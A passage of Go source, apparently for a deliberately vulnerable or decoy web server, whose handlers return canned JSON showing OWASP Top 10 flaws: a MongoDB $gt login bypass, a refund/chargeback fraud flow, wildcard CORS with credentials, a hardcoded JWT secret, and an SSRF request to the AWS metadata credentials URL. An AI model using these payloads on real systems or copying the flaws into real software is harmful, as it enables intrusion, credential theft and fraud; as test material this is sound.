		"method":     "POST",
		"original_request": map[string]interface{}{
			"username": "admin",
			"password": "anything",
		},
		"injected_request": map[string]interface{}{
			"username": "admin",
			"password": map[string]interface{}{"$gt": ""},
		},
		"mongodb_query": map[string]interface{}{
			"collection": "users",
			"filter":     "{ username: 'admin', password: { $gt: '' } }",
			"note":       "$gt operator matches any non-empty string — bypasses password check",
		},
		"query_result": map[string]interface{}{
			"authenticated": true,
			"user":          users[0],
		},
		"input_sanitization": false,
		"_comment":           "VIOLATION: NoSQL injection — MongoDB query operator in user input bypasses authentication",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W04: Insecure Design — business logic flaw in refund
func (h *Handler) serveWeb25InsecureDesign(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	orderID := "ORD-" + h.randomHex(rng, 6)
	fn := h.firstNames[rng.Intn(len(h.firstNames))]

	resp := toJSON(map[string]interface{}{
		"vulnerability": "business_logic_flaw",
		"flow":          "order_refund_process",
		"steps": []map[string]interface{}{
			{"step": 1, "action": "User places order", "order_id": orderID, "amount": "$499.99", "payment": "credit_card"},
			{"step": 2, "action": "User requests refund", "reason": "changed_mind", "refund_method": "store_credit"},
			{"step": 3, "action": "Refund issued as store credit", "credit_amount": "$499.99", "original_charge": "not_reversed"},
			{"step": 4, "action": "User initiates chargeback with bank", "chargeback_amount": "$499.99", "bank_refund": "approved"},
			{"step": 5, "action": "User spends store credit", "purchase_amount": "$499.99", "total_loss": "$999.98"},
		},
		"design_flaw": map[string]interface{}{
			"description": "Refund process does not invalidate store credit when chargeback is filed",
			"root_cause":  "No integration between payment processor chargeback notifications and store credit system",
			"abuse_by":    fn,
			"times_exploited": rng.Intn(50) + 5,
			"total_loss":  fmt.Sprintf("$%d,%03d.00", rng.Intn(90)+10, rng.Intn(1000)),
		},
		"missing_controls": []string{
			"No chargeback-to-credit reconciliation",
			"No velocity check on refund requests",
			"No hold period before store credit activation",
			"No fraud scoring on refund patterns",
		},
		"_comment": "VIOLATION: Business logic allows double-dipping — refund + chargeback for 2x the order value",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W05: Security Misconfiguration — CORS wildcard + verbose errors
func (h *Handler) serveWeb25Misconfig(w http.ResponseWriter, r *http.Request) int {
	// Set intentionally misconfigured headers
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Credentials", "true")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "*")
	w.Header().Set("X-Powered-By", "Express 4.17.1")
	w.Header().Set("Server", "Apache/2.4.49")
	w.Header().Set("Content-Type", "application/json")

	rng := h.rngFromPath(r.URL.Path)
	dbHost := fmt.Sprintf("db-prod-%s.internal.acme.corp", h.randomHex(rng, 4))

	resp := toJSON(map[string]interface{}{
		"cors_config": map[string]interface{}{
			"allow_origin":      "*",
			"allow_credentials": true,
			"allow_methods":     "GET, POST, PUT, DELETE, PATCH, OPTIONS",
			"allow_headers":     "*",
			"_comment":          "CORS wildcard with credentials is invalid per spec but some browsers process it unsafely",
		},
		"verbose_error_page": map[string]interface{}{
			"error":       "SQLSTATE[42P01]: Undefined table",
			"file":        "/opt/acme-app/src/controllers/UserController.php:247",
			"db_host":     dbHost,
			"db_port":     5432,
			"db_name":     "acme_production",
			"stack_frames": 14,
			"env_vars_exposed": []string{"DB_PASSWORD", "API_SECRET", "JWT_SECRET", "AWS_ACCESS_KEY_ID"},
		},
		"server_info_leaked": map[string]interface{}{
			"server_header":     "Apache/2.4.49",
			"x_powered_by":     "Express 4.17.1",
			"debug_mode":       true,
			"directory_listing": true,
			"default_error_pages": true,
		},
		"_comment": "VIOLATION: CORS wildcard + credentials, verbose errors leaking internals, server version exposed",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W06: Vulnerable Components — log4j, Spring4Shell
func (h *Handler) serveWeb25VulnComponents(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	_ = rng

	resp := toJSON(map[string]interface{}{
		"application": "acme-backend",
		"scan_date":   time.Now().UTC().Format(time.RFC3339),
		"dependencies": []map[string]interface{}{
			{
				"groupId": "org.apache.logging.log4j", "artifactId": "log4j-core", "version": "2.14.1",
				"cve": []map[string]interface{}{
					{"id": "CVE-2021-44228", "severity": "CRITICAL", "cvss": 10.0, "name": "Log4Shell", "exploited_in_wild": true},
					{"id": "CVE-2021-45046", "severity": "CRITICAL", "cvss": 9.0, "name": "Log4Shell bypass", "exploited_in_wild": true},
				},
			},
			{
				"groupId": "org.springframework", "artifactId": "spring-beans", "version": "5.3.17",
				"cve": []map[string]interface{}{
					{"id": "CVE-2022-22965", "severity": "CRITICAL", "cvss": 9.8, "name": "Spring4Shell", "exploited_in_wild": true},
				},
			},
			{
				"groupId": "com.fasterxml.jackson.core", "artifactId": "jackson-databind", "version": "2.9.8",
				"cve": []map[string]interface{}{
					{"id": "CVE-2019-12086", "severity": "HIGH", "cvss": 7.5, "name": "Polymorphic deserialization RCE", "exploited_in_wild": true},
				},
			},
			{
				"groupId": "org.apache.commons", "artifactId": "commons-text", "version": "1.9",
				"cve": []map[string]interface{}{
					{"id": "CVE-2022-42889", "severity": "CRITICAL", "cvss": 9.8, "name": "Text4Shell", "exploited_in_wild": true},
				},
			},
		},
		"dependency_management": map[string]interface{}{
			"sca_tool":           "none",
			"auto_update":        false,
			"vulnerability_scan": "never",
			"sbom_generated":     false,
			"last_dependency_update": "2021-11-01",
		},
		"_comment": "VIOLATION: Multiple critical CVEs including Log4Shell and Spring4Shell — no dependency scanning",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W07: Auth Failures — JWT with long expiry, no rotation
func (h *Handler) serveWeb25AuthFailures(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	fn := h.firstNames[rng.Intn(len(h.firstNames))]
	iat := time.Now().UTC()
	exp := iat.Add(30 * 24 * time.Hour)

	resp := toJSON(map[string]interface{}{
		"endpoint": "/api/auth/token",
		"jwt_config": map[string]interface{}{
			"algorithm":        "HS256",
			"secret":           "acme-jwt-secret-do-not-change",
			"issuer":           "acme-auth",
			"expiry":           "30 days",
			"refresh_rotation": false,
			"revocation_list":  "not_implemented",
		},
		"issued_token": map[string]interface{}{
			"header":  map[string]interface{}{"alg": "HS256", "typ": "JWT"},
			"payload": map[string]interface{}{
				"sub":   h.randomHex(rng, 8),
				"name":  fn,
				"role":  "admin",
				"iat":   iat.Unix(),
				"exp":   exp.Unix(),
				"jti":   h.randomHex(rng, 16),
			},
			"signature": h.randomHex(rng, 32),
		},
		"vulnerabilities": []string{
			"30-day expiry — token valid even after password change",
			"HS256 with weak shared secret — susceptible to brute force",
			"No refresh token rotation — stolen refresh token valid indefinitely",
			"No token revocation — cannot invalidate compromised tokens",
			"Role embedded in token — privilege escalation via token manipulation",
			"No audience claim — token accepted by all services",
		},
		"_comment": "VIOLATION: JWT with 30-day expiry, weak secret, no refresh rotation, no revocation capability",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W08: Data Integrity Failures — CI with no signed commits
func (h *Handler) serveWeb25DataIntegrity(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)

	resp := toJSON(map[string]interface{}{
		"pipeline":   "acme-backend-ci",
		"provider":   "GitHub Actions",
		"repository": "acme-corp/backend",
		"branch":     "main",
		"last_deploy": time.Now().UTC().Format(time.RFC3339),
		"pipeline_config": map[string]interface{}{
			"signed_commits_required":  false,
			"branch_protection":        false,
			"required_reviewers":       0,
			"codeowners_enforced":      false,
			"status_checks_required":   false,
		},
		"deployment": map[string]interface{}{
			"auto_deploy_on_push": true,
			"artifact_signing":    false,
			"image_scanning":      false,
			"sbom_generation":     false,
			"provenance_attestation": false,
		},
		"recent_commits": []map[string]interface{}{
			{"sha": h.randomHex(rng, 8), "author": "unknown-contributor", "signed": false, "message": "quick fix", "reviewed": false, "deployed": true},
			{"sha": h.randomHex(rng, 8), "author": "bot-account", "signed": false, "message": "update deps", "reviewed": false, "deployed": true},
			{"sha": h.randomHex(rng, 8), "author": "ex-employee@personal.com", "signed": false, "message": "add feature", "reviewed": false, "deployed": true},
		},
		"supply_chain_risks": []string{
			"No commit signing — anyone can impersonate committers",
			"No branch protection — direct push to main allowed",
			"No code review required — unreviewed code auto-deployed",
			"No artifact signing — deployed binaries not verified",
			"Ex-employee commits still accepted and deployed",
		},
		"_comment": "VIOLATION: CI pipeline with no integrity controls — unsigned commits auto-deployed to production",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W09: Logging & Monitoring Failure — WAF with no alerting
func (h *Handler) serveWeb25LoggingFailure(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")

	resp := toJSON(map[string]interface{}{
		"waf": map[string]interface{}{
			"provider":     "CloudFlare (free tier)",
			"mode":         "detect_only",
			"alerting":     false,
			"notification": []string{},
			"rules_updated": "2023-01-15",
		},
		"logging": map[string]interface{}{
			"access_logs":    true,
			"error_logs":     true,
			"security_logs":  false,
			"log_retention":  "24 hours",
			"centralized":    false,
			"searchable":     false,
			"log_destination": "/var/log/nginx/access.log (local only)",
		},
		"monitoring": map[string]interface{}{
			"uptime_check":       true,
			"security_monitoring": false,
			"anomaly_detection":  false,
			"incident_response":  "no_plan",
			"mean_time_to_detect": "unknown — no detection capability",
		},
		"undetected_events_last_30d": map[string]interface{}{
			"sql_injection_attempts":  2847,
			"xss_attempts":            1923,
			"brute_force_attacks":     12456,
			"credential_stuffing":     8934,
			"directory_traversal":     567,
			"alerts_generated":        0,
			"incidents_created":       0,
		},
		"_comment": "VIOLATION: WAF in detect-only mode, 24hr log retention, no alerting — attacks go completely unnoticed",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W10: SSRF — PDF generator fetching user-controlled URLs
func (h *Handler) serveWeb25SSRF(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	jobID := "pdf-" + h.randomHex(rng, 8)
	targetURL := r.URL.Query().Get("url")
	if targetURL == "" {
		targetURL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
	}

	resp := toJSON(map[string]interface{}{
		"endpoint": "/api/reports/generate-pdf",
		"method":   "POST",
		"job_id":   jobID,
		"request": map[string]interface{}{
			"template": "invoice",
			"logo_url": targetURL,
			"note":     "User-supplied URL fetched server-side for PDF rendering",
		},
		"server_side_fetch": map[string]interface{}{
			"url_requested": targetURL,
			"resolved_ip":  "169.254.169.254",
			"response_code": 200,
			"response_body": map[string]interface{}{
				"Code":            "Success",
				"AccessKeyId":     "AKIA" + h.randomHex(rng, 16),
				"SecretAccessKey": h.randomHex(rng, 40),
				"Token":           h.randomHex(rng, 64),
				"Expiration":      time.Now().UTC().Add(6 * time.Hour).Format(time.RFC3339),
			},
		},
		"ssrf_protections": map[string]interface{}{
			"url_allowlist":     false,
			"private_ip_block":  false,
			"dns_rebinding_protection": false,
			"response_filtering": false,
			"network_segmentation": false,
			"imds_v2_required":  false,
		},
		"_comment": "VIOLATION: SSRF — PDF generator fetches user-controlled URLs, leaking cloud metadata credentials",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}
